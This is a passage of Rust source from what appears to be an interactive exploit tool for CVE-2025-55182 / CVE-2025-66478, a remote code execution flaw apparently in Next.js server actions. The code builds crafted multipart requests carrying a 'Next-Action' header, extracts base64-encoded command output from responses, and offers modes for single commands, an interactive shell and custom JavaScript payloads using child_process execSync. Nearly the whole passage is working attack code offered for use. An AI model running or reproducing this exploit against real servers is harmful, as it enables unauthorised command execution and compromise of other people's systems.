        let alt_chunk_ref = format!(r#""$@0""#);
        let alt_body = format!(
            "{}\r\nContent-Disposition: form-data; name=\"0\"\r\n\r\n{}\r\n{}\r\nContent-Disposition: form-data; name=\"1\"\r\n\r\n{}\r\n{}\r\nContent-Disposition: form-data; name=\"2\"\r\n\r\n[]\r\n{}--",
            BOUNDARY, alt_payload, BOUNDARY, alt_chunk_ref, BOUNDARY, BOUNDARY
        );

        let mut alt_request = client.post(url)
            .header("Host", &host)
            .header("Content-Type", format!("multipart/form-data; boundary={}", BOUNDARY_HEADER))
            .header("Next-Action", "x")
            .header("User-Agent", user_agent);

        for (key, value) in &config.custom_headers {
            alt_request = alt_request.header(key, value);
        }

        if let Ok(alt_response) = alt_request.body(alt_body).send().await {
            let alt_text = alt_response.text().await.unwrap_or_default();
            
            for (line_num, line) in alt_text.lines().enumerate() {
                // Check primary login?a= pattern
                for cap in login_pattern.captures_iter(line) {
                    if let Some(encoded) = cap.get(1) {
                        let encoded_str = encoded.as_str();
                        if let Ok(decoded) = decode_base64_output(encoded_str) {
                            if let Some(full_match) = cap.get(0) {
                                let match_start = full_match.start();
                                let match_end = full_match.end();

                                matches.push(Match {
                                    location: format!("Body Line {} (Alternative Payload - login?a=)", line_num + 1),
                                    full_line: if line.len() > 200 {
                                        format!("{}...", &line[..200])
                                    } else {
                                        line.to_string()
                                    },
                                    matched_text: full_match.as_str().to_string(),
                                    encoded_output: encoded_str.to_string(),
                                    decoded_output: decoded,
                                    context: highlight_text(line, match_start, match_end, config.use_color),
                                });
                            }
                        }
                    }
                }

                // Check alternative patterns for fallback
                for (pattern_idx, pattern) in error_patterns.iter().enumerate() {
                    for cap in pattern.captures_iter(line) {
                        if let Some(encoded) = cap.get(1) {
                            let encoded_str = encoded.as_str();
                            let decoded = match decode_base64_output(encoded_str) {
                                Ok(d) => d,
                                Err(_) => {
                                    if encoded_str.contains('\n') || encoded_str.len() > 50 {
                                        encoded_str.to_string()
                                    } else {
                                        continue;
                                    }
                                }
                            };

                            if let Some(full_match) = cap.get(0) {
                                let match_start = full_match.start();
                                let match_end = full_match.end();

                                matches.push(Match {
                                    location: format!("Body Line {} (Alternative Payload - Pattern {})", line_num + 1, pattern_idx + 1),
                                    full_line: if line.len() > 200 {
                                        format!("{}...", &line[..200])
                                    } else {
                                        line.to_string()
                                    },
                                    matched_text: full_match.as_str().to_string(),
                                    encoded_output: encoded_str.to_string(),
                                    decoded_output: decoded,
                                    context: highlight_text(line, match_start, match_end, config.use_color),
                                });
                            }
                        }
                    }
                }
            }
        }
    }
    
    // Create combined output
    let combined_output = matches
        .iter()
        .filter(|m| !m.decoded_output.contains("[Decoding error"))
        .map(|m| m.decoded_output.as_str())
        .collect::<Vec<_>>()
        .join("\n");

    Ok(ExploitResult {
        url: url.to_string(),
        status: Some(status),
        matches,
        response_headers,
        response_body: response_text,
        request_headers,
        custom_command: custom_command.map(|s| s.to_string()),
        error: None,
        combined_output,
    })
}

/// Main entry point - matches framework signature
pub async fn run(target: &str) -> Result<()> {
    print_banner();
    
    // Normalize target URL
    let mut base_url = target.trim().to_string();
    if !base_url.starts_with("http://") && !base_url.starts_with("https://") {
        base_url = format!("http://{}", base_url);
    }
    let base_url = base_url.trim_end_matches('/').to_string();
    
    println!("{}", format!("[*] Target: {}", base_url).yellow());
    
    // Build configuration
    let mut config = ExploitConfig::default();
    config.target = base_url.clone();
    
    // Prompt for advanced options
    config.verbose = prompt_yes_no("Verbose mode", false).await?;
    config.verify_ssl = !prompt_yes_no("Skip SSL verification", false).await?;
    config.random_agent = prompt_yes_no("Use random User-Agent", false).await?;
    
    let timeout_str = prompt_default("Timeout (seconds)", "30").await?;
    config.timeout = timeout_str.parse().unwrap_or(30);
    
    // Proxy support
    let use_proxy = prompt_yes_no("Use proxy", false).await?;
    if use_proxy {
        let proxy_url = prompt("Proxy URL (e.g., http://127.0.0.1:8080)").await?;
        if !proxy_url.is_empty() {
            config.proxy = Some(proxy_url);
        }
    }
    
    // Custom headers
    let use_custom_headers = prompt_yes_no("Add custom headers", false).await?;
    if use_custom_headers {
        loop {
            let header_input = prompt("Custom header (format: Header: Value, or 'done' to finish)").await?;
            if header_input == "done" || header_input.is_empty() {
                break;
            }
            if let Some(colon_pos) = header_input.find(':') {
                let key = header_input[..colon_pos].trim().to_string();
                let value = header_input[colon_pos + 1..].trim().to_string();
                if !key.is_empty() && !value.is_empty() {
                    config.custom_headers.push((key, value));
                }
            }
        }
    }
    
    // Build HTTP client
    let mut client_builder = Client::builder()
        .timeout(Duration::from_secs(config.timeout))
        .danger_accept_invalid_certs(!config.verify_ssl);
    
    if let Some(proxy_url) = &config.proxy {
        let proxy = reqwest::Proxy::all(proxy_url)
            .context("Failed to create proxy")?;
        client_builder = client_builder.proxy(proxy);
    }
    
    let client = client_builder.build()
        .context("Failed to build HTTP client")?;
    
    // Prompt for mode
    println!();
    println!("{}", "Select mode:".yellow().bold());
    println!("  1. Vulnerability Detection (quick check)");
    println!("  2. Execute Single Command");
    println!("  3. Interactive Shell");
    println!("  4. Custom RCE Payload");
    println!();
    
    print!("{}", "Mode [1-4]: ".cyan().bold());
    tokio::io::stdout()
        .flush()
        .await
        .context("Failed to flush stdout")?;
    let mut mode_input = String::new();
    tokio::io::BufReader::new(tokio::io::stdin())
        .read_line(&mut mode_input)
        .await
        .context("Failed to read mode input")?;
    let mode = mode_input.trim();
    
    match mode {
        "1" => {
            println!("{}", "[*] Checking for vulnerability...".cyan());
            match check_vulnerability(&client, &base_url, &config).await {
                Ok(true) => {
                    println!("{}", "[+] Target is VULNERABLE!".red().bold());
                    println!("{}", "[+] CVE-2025-55182 / CVE-2025-66478 confirmed".red().bold());
                }
                Ok(false) => {
                    println!("{}", "[-] Target does not appear to be vulnerable.".green());
                }
                Err(e) => {
                    println!("{}", format!("[-] Error checking vulnerability: {}", e).red());
                }
            }
        }
        "2" => {
            println!();
            println!("{}", "Select RCE payload type:".yellow().bold());
            println!("  1. whoami (default)");
            println!("  2. id");
            println!("  3. pwd");
            println!("  4. uname -a");
            println!("  5. ls -la");
            println!("  6. ps aux");
            println!("  7. Custom command");
            println!();
            
            let payload_choice = prompt_default("Payload type [1-7]", "1").await?;
            
            let (payload_type, custom_cmd) = match payload_choice.as_str() {
                "1" => ("whoami", None),
                "2" => ("id", None),
                "3" => ("pwd", None),
                "4" => ("uname", None),
                "5" => ("ls", None),
                "6" => ("ps", None),
                "7" => {
                    let cmd = prompt("Custom command to execute").await?;
                    if cmd.is_empty() {
                        return Err(anyhow!("Command cannot be empty"));
                    }
                    ("custom_cmd", Some(cmd))
                }
                _ => ("whoami", None),
            };
            
            println!("{}", format!("[*] Executing payload: {}", payload_type).cyan());
            match execute_command_with_payload(&client, &base_url, payload_type, custom_cmd.as_deref(), None, &config).await {
                Ok(result) => {
                    print_results(&result, &config);
                }
                Err(e) => {
                    println!("{}", format!("[-] Error executing command: {}", e).red());
                }
            }
        }
        "3" => {
            interactive_shell(&client, &base_url, &config).await?;
        }
        "4" => {
            println!();
            println!("{}", "Custom RCE Payload Mode".yellow().bold());
            println!("{}", "Enter custom JavaScript code to execute on the target".cyan());
            println!("{}", "Example: var res=process.mainModule.require('child_process').execSync('id').toString();".dimmed());
            println!();
            
            let custom_js = prompt("Custom JavaScript code").await?;
            if custom_js.is_empty() {
                return Err(anyhow!("JavaScript code cannot be empty"));
            }
            
            println!("{}", format!("[*] Executing custom JavaScript payload...").cyan());
            match execute_command_with_payload(&client, &base_url, "custom_js", None, Some(&custom_js), &config).await {
                Ok(result) => {
                    print_results(&result, &config);
                }
                Err(e) => {
                    println!("{}", format!("[-] Error executing custom payload: {}", e).red());
                }
            }
        }
        _ => {
            return Err(anyhow!("Invalid mode selected"));
        }
    }
    
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_payload_creation() {
        let payload = create_payload_base64("whoami");
        assert!(payload.contains("whoami"));
        assert!(payload.contains("base64"));
    }

    #[test]
    fn test_decode_base64() {
        let encoded = "dGVzdAo="; // "test\n" in base64
        let decoded = decode_base64_output(encoded).unwrap();
        assert_eq!(decoded, "test\n");
    }
}